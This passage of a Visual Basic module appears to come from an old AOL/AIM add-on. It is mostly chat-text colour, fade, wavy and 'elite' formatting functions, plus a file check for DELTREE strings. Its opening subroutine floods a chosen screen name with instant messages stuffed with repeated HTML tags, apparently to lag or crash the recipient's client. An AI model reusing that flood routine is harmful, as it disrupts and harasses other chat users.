Wave$ = "<BODY BGCOLOR=#fffffe><HTML><PRE>   <FONT SIZE=5 <FONT COLOR=#00ff00><BODY BGCOLOR=#000000></sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_"
shake$ = "<BODY BGCOLOR=#fffffe><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>Ouwopz<html></html><html>MazTa ProGG"


Call AIM_SendIM(sn$, "<BODY BGCOLOR=#fffffe><BODY BGCOLOR=#00ff00><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#0sff00><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ff0f><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ffff><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#0fff00><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00fff0><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ffff><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#000f00><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00fff0><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ff0f><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#f0fff0><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#f0f0f0><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ffff><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#fffff0><h3><h2><h3><h2><h3><h2>")
    TimeOut (1)
     Call AIM_RespondA("<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.")
      TimeOut (0.8)
     Call AIM_RespondA(lag$)
        TimeOut (0.8)
     Call AIM_RespondA(dot$)
        TimeOut (0.8)
     Call AIM_RespondA(Color$)
      TimeOut (0.8)
     Call AIM_RespondA(Wave$)
        TimeOut (0.8)
     Call AIM_RespondA(Line$)
        TimeOut (0.8)
     Call AIM_RespondA(Wave$)
        TimeOut (0.8)
     Call AIM_RespondA(Line$)
        TimeOut (0.8)
     Call AIM_RespondA(shake$)
        TimeOut (2)
    '<BODY BGCOLOR=#fffffe><BODY BGCOLOR=#00ff00><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#0sff00><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ff0f><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ffff><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#0fff00><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00fff0><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ffff><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#000f00><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00fff0><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ff0f><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#f0fff0><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#f0f0f0><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ffff><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#fffff0><h3><h2><h3><h2><h3><h2>

End Sub
Function BoldPurpleWhitePurple(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255, f, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
  BoldSendChat (Msg)
End Function

Function BoldAOL4_WavColors(text1 As String)
g$ = text1
a = Len(g$)
For w = 1 To a Step 4
    r$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)
    t$ = Mid$(g$, w + 3, 1)
    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006600" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#ff0000" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "##006600" & Chr$(34) & "></b>" & t$
Next w
sendchat (p$)
End Function
Function BoldGreenRedGreen(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(0, 255 - f, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<B><Font Color=#" & h & ">" & d
    Next b
   sendchat (Msg)
End Function
Sub BoldWavY(TheText)

g$ = TheText
a = Len(g$)
For w = 1 To a Step 4
    r$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)
    t$ = Mid$(g$, w + 3, 1)
    p$ = p$ & "<sup>" & r$ & "<B></sup>" & u$ & "<sub>" & s$ & "</sub>" & t$
Next w
BoldSendChat (p$)

End Sub
Function FindAOLsMDI()
'this can be used instead of typing out the two
'lines of code below
AOL% = FindWindow("AOL Frame25", vbNullString)
FindAOLsMDI = FindChildByClass(AOL%, "MDIClient")
End Function
Public Function pause(Duration As Long)
    Dim Current As Long
    Current = Timer
    Do Until Timer - Current >= Duration
        DoEvents
    Loop
End Function

Function r_backwards(strin As String)
'Returns the strin backwards
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let newsent$ = NextChr$ & newsent$
Loop
r_backwards = newsent$

End Function

Function R_Elite(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While NumSpc% <= lenth%
DoEvents
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let nextchrr$ = Mid$(inptxt$, NumSpc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo dustepp2
If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo dustepp2
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo dustepp2
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo dustepp2
If crapp% > 0 Then GoTo dustepp2

If NextChr$ = "A" Then Let NextChr$ = "A"
If NextChr$ = "a" Then Let NextChr$ = "å"
If NextChr$ = "B" Then Let NextChr$ = "ß"
If NextChr$ = "C" Then Let NextChr$ = "Ç"
If NextChr$ = "c" Then Let NextChr$ = "¢"
If NextChr$ = "D" Then Let NextChr$ = "Ð"
If NextChr$ = "d" Then Let NextChr$ = "d"
If NextChr$ = "E" Then Let NextChr$ = "Ê"
If NextChr$ = "e" Then Let NextChr$ = "è"
If NextChr$ = "f" Then Let NextChr$ = "ƒ"
If NextChr$ = "F" Then Let NextChr$ = "F"
If NextChr$ = "H" Then Let NextChr$ = "H"
If NextChr$ = "h" Then Let NextChr$ = "h"
If NextChr$ = "I" Then Let NextChr$ = "‡"
If NextChr$ = "i" Then Let NextChr$ = "î"
If NextChr$ = "J" Then Let NextChr$ = "J"
If NextChr$ = "j" Then Let NextChr$ = "j"
If NextChr$ = "k" Then Let NextChr$ = "|‹"
If NextChr$ = "K" Then Let NextChr$ = "k"
If NextChr$ = "L" Then Let NextChr$ = "£"
If NextChr$ = "l" Then Let NextChr$ = "l"
If NextChr$ = "M" Then Let NextChr$ = "(\/)"
If NextChr$ = "m" Then Let NextChr$ = "m"
If NextChr$ = "N" Then Let NextChr$ = "/\/"
If NextChr$ = "n" Then Let NextChr$ = "ñ"
If NextChr$ = "O" Then Let NextChr$ = "Ø"
If NextChr$ = "o" Then Let NextChr$ = "o"
If NextChr$ = "P" Then Let NextChr$ = "P"
If NextChr$ = "p" Then Let NextChr$ = "Þ"
If NextChr$ = "q" Then Let NextChr$ = "Q"
If NextChr$ = "Q" Then Let NextChr$ = "q"
If NextChr$ = "r" Then Let NextChr$ = "®"
If NextChr$ = "R" Then Let NextChr$ = "®"
If NextChr$ = "S" Then Let NextChr$ = "§"
If NextChr$ = "s" Then Let NextChr$ = "$"
If NextChr$ = "t" Then Let NextChr$ = "†"
If NextChr$ = "T" Then Let NextChr$ = "T"
If NextChr$ = "U" Then Let NextChr$ = "Ú"
If NextChr$ = "u" Then Let NextChr$ = "u"
If NextChr$ = "V" Then Let NextChr$ = "\/"
If NextChr$ = "v" Then Let NextChr$ = "v"
If NextChr$ = "W" Then Let NextChr$ = "VV"
If NextChr$ = "w" Then Let NextChr$ = "vv"
If NextChr$ = "X" Then Let NextChr$ = "X"
If NextChr$ = "x" Then Let NextChr$ = "×"
If NextChr$ = "Y" Then Let NextChr$ = "¥"
If NextChr$ = "y" Then Let NextChr$ = "ý"
If NextChr$ = "z" Then Let NextChr$ = "Z"
If NextChr$ = "Z" Then Let NextChr$ = "z"
If NextChr$ = "!" Then Let NextChr$ = "¡"
If NextChr$ = "?" Then Let NextChr$ = "?"
If NextChr$ = "." Then Let NextChr$ = "."
If NextChr$ = "," Then Let NextChr$ = "‚"
If NextChr$ = "1" Then Let NextChr$ = "1"
If NextChr$ = "%" Then Let NextChr$ = "‰"
If NextChr$ = "2" Then Let NextChr$ = "2"
If NextChr$ = "3" Then Let NextChr$ = "3"
If NextChr$ = "_" Then Let NextChr$ = "_"
If NextChr$ = "-" Then Let NextChr$ = "—"
If NextChr$ = " " Then Let NextChr$ = " "
Let newsent$ = newsent$ + NextChr$

dustepp2:
If crapp% > 0 Then Let crapp% = crapp% - 1
DoEvents
Loop
R_Elite = newsent$

End Function
Function R_Hacker(strin As String)
'Returns the strin hacker style
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
If NextChr$ = "A" Then Let NextChr$ = "a"
If NextChr$ = "E" Then Let NextChr$ = "e"
If NextChr$ = "I" Then Let NextChr$ = "i"
If NextChr$ = "O" Then Let NextChr$ = "o"
If NextChr$ = "U" Then Let NextChr$ = "u"
If NextChr$ = "b" Then Let NextChr$ = "B"
If NextChr$ = "c" Then Let NextChr$ = "C"
If NextChr$ = "d" Then Let NextChr$ = "D"
If NextChr$ = "z" Then Let NextChr$ = "Z"
If NextChr$ = "f" Then Let NextChr$ = "F"
If NextChr$ = "g" Then Let NextChr$ = "G"
If NextChr$ = "h" Then Let NextChr$ = "H"
If NextChr$ = "y" Then Let NextChr$ = "Y"
If NextChr$ = "j" Then Let NextChr$ = "J"
If NextChr$ = "k" Then Let NextChr$ = "K"
If NextChr$ = "l" Then Let NextChr$ = "L"
If NextChr$ = "m" Then Let NextChr$ = "M"
If NextChr$ = "n" Then Let NextChr$ = "N"
If NextChr$ = "x" Then Let NextChr$ = "X"
If NextChr$ = "p" Then Let NextChr$ = "P"
If NextChr$ = "q" Then Let NextChr$ = "Q"
If NextChr$ = "r" Then Let NextChr$ = "R"
If NextChr$ = "s" Then Let NextChr$ = "S"
If NextChr$ = "t" Then Let NextChr$ = "T"
If NextChr$ = "w" Then Let NextChr$ = "W"
If NextChr$ = "v" Then Let NextChr$ = "V"
If NextChr$ = " " Then Let NextChr$ = " "
Let newsent$ = newsent$ + NextChr$
Loop
R_Hacker = newsent$

End Function
Function r_same(strr As String)
'Returns the strin the same
Let r_same = Trim(strr)

End Function
Function R_Spaced(strin As String)
'Returns the strin spaced
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let NextChr$ = NextChr$ + "-"
Let newsent$ = newsent$ + NextChr$
Loop
R_Spaced = newsent$

End Function
Function Scanfile(FileName As String, SearchString As String) As Long
free = FreeFile
Dim Where As Long
Open FileName For Binary Access Read As #free
For X = 1 To LOF(free) Step 32000
    
    Text$ = Space(32000)
   Get #free, X, Text$

    Debug.Print X
    If InStr(1, Text$, SearchString$, 1) Then
MsgBox "File " + FileName + " is a DELTREE!"
sendchat ("<b><I><U>(¯`^File " + FileName + " Is a DELTREE!")
Else
MsgBox "File " + FileName + " is Safe!"
sendchat ("<b><I><U>(¯`^File " + FileName + " Is Safe!!")
End If
        Where = InStr(1, Text$, SearchString$, 1)
        Scanfile = (Where + X) - 1
        Close #free

Next X
Close #free



End Function

Function BoldAOL4_WavColors2(text1 As String)
g$ = text1
a = Len(g$)
For w = 1 To a Step 4
    r$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)
    t$ = Mid$(g$, w + 3, 1)
    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006600" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "##006600" & Chr$(34) & ">" & t$
Next w
BoldSendChat (p$)
End Function
Function Text_Period(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let NextChr$ = NextChr$ + "-"
Let newsent$ = newsent$ + NextChr$
Loop
Text_Period = newsent$
End Function
Function Text_Looping(txt As String)
Dim thecaption, Captionlen, middlelen, Firstletter, Middle
If txt = "" Then GoTo deAd
thecaption = txt
Captionlen = Len(thecaption)
middlelen = Captionlen - 1
Firstletter = Left$(thecaption, 1)
Middle = Right(thecaption, middlelen)
Text_Looping = Middle & Firstletter
GoTo last
deAd:
Text_Looping = ""
last:
End Function









Sub ScrollingCredits(lbl As Label)
'ouwop
lbl.top = Val(lbl.top) - 20
End Sub
Function BoldWavyChatBlueBlack(TheText)
g$ = TheText
a = Len(g$)
For w = 1 To a Step 4
    r$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)
    t$ = Mid$(g$, w + 3, 1)
    p$ = p$ & "<B><FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#F0" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & t$
Next w
BoldWavyChatBlueBlack = (p$)
End Function
Function BoldWavyColorbluegree(TheText)
g$ = TheText
a = Len(g$)
For w = 1 To a Step 4
    r$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)
    t$ = Mid$(g$, w + 3, 1)
    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006600" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "##006600" & Chr$(34) & "></b>" & t$
Next w
BoldWavyColorbluegree = (p$)
End Function
Function BoldWavyColorredandblack(TheText)

g$ = TheText
a = Len(g$)
For w = 1 To a Step 4
    r$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)
    t$ = Mid$(g$, w + 3, 1)
    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "></b>" & t$
Next w
BoldWavyColorredandblack = (p$)
End Function
Function BoldPurpleRedPurple(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255 - f, 0, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
BoldSendChat (Msg)
End Function
Sub BoldItalicSendChat(BoldChat)
'This is new it makes the chat text bold.
'example:
'BoldSendChat ("ThIs Is BoLd")
'It will come out bold on the chat screen.
sendchat ("<font face=arial><b><i>" & BoldChat & "</i></b>")
End Sub
Function BoldRedPurple(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(f, 0, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
 BoldSendChat (Msg)
End Function
Function Bolditalic_BluePurpleBlue(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255, 0, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<B><I><Font Color=#" & h & ">" & d
    Next b
 sendchat (Msg)
End Function















Function BoldYellowBlackYellow(Text As String)
'use dida
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(0, 255 - f, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
   BoldYellowBlackYellow = (Msg)
End Function
Function BoldBlackRedBlack(Text As String)
'#200

    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(0, 0, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
  BoldSendChat (Msg)
End Function
Sub BoldFadeBlack(TheText As String)
a = Len(TheText)
For w = 1 To a Step 18
    ab$ = Mid$(TheText, w, 1)
    u$ = Mid$(TheText, w + 1, 1)
    s$ = Mid$(TheText, w + 2, 1)
    t$ = Mid$(TheText, w + 3, 1)
    Y$ = Mid$(TheText, w + 4, 1)
    l$ = Mid$(TheText, w + 5, 1)
    f$ = Mid$(TheText, w + 6, 1)
    b$ = Mid$(TheText, w + 7, 1)
    c$ = Mid$(TheText, w + 8, 1)
    d$ = Mid$(TheText, w + 9, 1)
    h$ = Mid$(TheText, w + 10, 1)
    J$ = Mid$(TheText, w + 11, 1)
    k$ = Mid$(TheText, w + 12, 1)
    m$ = Mid$(TheText, w + 13, 1)
    n$ = Mid$(TheText, w + 14, 1)
    q$ = Mid$(TheText, w + 15, 1)
    v$ = Mid$(TheText, w + 16, 1)
    z$ = Mid$(TheText, w + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#000000>" & ab$ & "<FONT COLOR=#111111>" & u$ & "<FONT COLOR=#222222>" & s$ & "<FONT COLOR=#333333>" & t$ & "<FONT COLOR=#444444>" & Y$ & "<FONT COLOR=#555555>" & l$ & "<FONT COLOR=#666666>" & f$ & "<FONT COLOR=#777777>" & b$ & "<FONT COLOR=#888888>" & c$ & "<FONT COLOR=#999999>" & d$ & "<FONT COLOR=#888888>" & h$ & "<FONT COLOR=#777777>" & J$ & "<FONT COLOR=#666666>" & k$ & "<FONT COLOR=#555555>" & m$ & "<FONT COLOR=#444444>" & n$ & "<FONT COLOR=#333333>" & q$ & "<FONT COLOR=#222222>" & v$ & "<FONT COLOR=#111111>" & z$
Next w
sendchat (PC$)
'Code for the room shit will be
'Call Fadeblack(Text1.text)


'to make any of the subs werk in ims
'You will need 2 text boxes and a button
'Do the change below and copy that to your send button
   ' a = Len(Text2.text)
    'For B = 1 To a
        'c = Left(Text2.text, B)
        'D = Right(c, 1)
        'e = 255 / a
        'F = e * B
        'G = RGB(F, 0, 0)
        'H = RGBtoHEX(G)
    ' Dim msg
    ' msg=msg & "<B><Font Color=#" & H & ">" & D
    'Next B
   ' Call IMKeyword(Text1.text, msg)
'u can do it for mail too but
'that is harder and I will leave that to u
'to figure out
End Sub
Function BoldGreyRedGrey(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
BoldSendChat (Msg)
End Function
Function BoldLBlue_Orange(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(255 - f, 155, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    LBlue_Orange (Msg)
End Function

Function LBlue_Orange(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(255 - f, 155, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    LBlue_Orange = Msg
End Function
Function BoldLBlue_Orange_LBlue(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255 - f, 155, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    LBlue_Orange_LBlue (Msg)
End Function


Function LBlue_Orange_LBlue(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255 - f, 155, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    LBlue_Orange_LBlue = Msg
End Function
Function BoldGreyBlackGrey(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Sub StrikeOutSendChat(StrikeOutChat)
sendchat ("<S>" & StrikeOutChat & "</S>")
End Sub
Sub AOL4_Un_GhozT()
'''''''OUWOP
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
XAOL4_Keyword ("buddy")
Do: DoEvents
aa1% = FindChildByTitle(MDI%, getuser & "'s Buddy List")
Loop Until aa1% <> 0
a2% = FindChildByClass(aa1%, "_AOL_Listbox")
a7% = GetWindow(a2%, GW_HWNDNEXT)
a7% = GetWindow(a7%, GW_HWNDNEXT)
a7% = GetWindow(a7%, GW_HWNDNEXT)
a7% = GetWindow(a7%, GW_HWNDNEXT)
a7% = GetWindow(a7%, GW_HWNDNEXT)
Do: DoEvents
Call cLickiCoN(a7%)
pause (0.5)
b1% = FindChildByTitle(MDI%, "Privacy Preferences")
Loop Until b1% <> 0
TimeOut (0.4)
d2% = FindChildByClass(b1%, "_AOL_checkbox")
TimeOut (0.1)
cLickiCoN (d2%)
TimeOut (0.6)
b3% = GetWindow(d2%, GW_HWNDNEXT)
b3% = GetWindow(b3%, GW_HWNDNEXT)
b3% = GetWindow(b3%, GW_HWNDNEXT)
b3% = GetWindow(b3%, GW_HWNDNEXT)
b3% = GetWindow(b3%, GW_HWNDNEXT)
b3% = GetWindow(b3%, GW_HWNDNEXT)
b3% = GetWindow(b3%, GW_HWNDNEXT)
b3% = GetWindow(b3%, GW_HWNDNEXT)
b3% = GetWindow(b3%, GW_HWNDNEXT)
b3% = GetWindow(b3%, GW_HWNDNEXT)
b3% = GetWindow(b3%, GW_HWNDNEXT) 'add
b3% = GetWindow(b3%, GW_HWNDNEXT)
b3% = GetWindow(b3%, GW_HWNDNEXT) 'remove
b3% = GetWindow(b3%, GW_HWNDNEXT) 'save
TimeOut (0.2)
cLickiCoN (b3%)
TimeOut (0.5)
AOL4_KillWin (aa1%)
End Sub

Sub UnderLineSendChat(UnderLineChat)
' underlines chat text.
sendchat ("<u>" & UnderLineChat & "</u>")
End Sub

Sub ItalicSendChat(ItalicChat)
'Makes chat text in Italics.
sendchat ("<i>" & ItalicChat & "</i>")
End Sub

Function Bolditalic_BlackPurpleBlack(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(f, 0, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<B><I><Font Color=#" & h & ">" & d
    Next b
   sendchat (Msg)
End Function



Function LoadTimes(FileName)
'i dont uze diz i rathuh uze INI_WRITE
        free = FreeFile
    Open FileName For Random As free
    Close free
    Open FileName For Input As free
i = FileLen(FileName)
X = Input(i, free)
    Close free

    Open FileName For Output As #1
X = Val(X) + 1
    Print #1, X
    Close #1
        LoadTimes = X
End Function

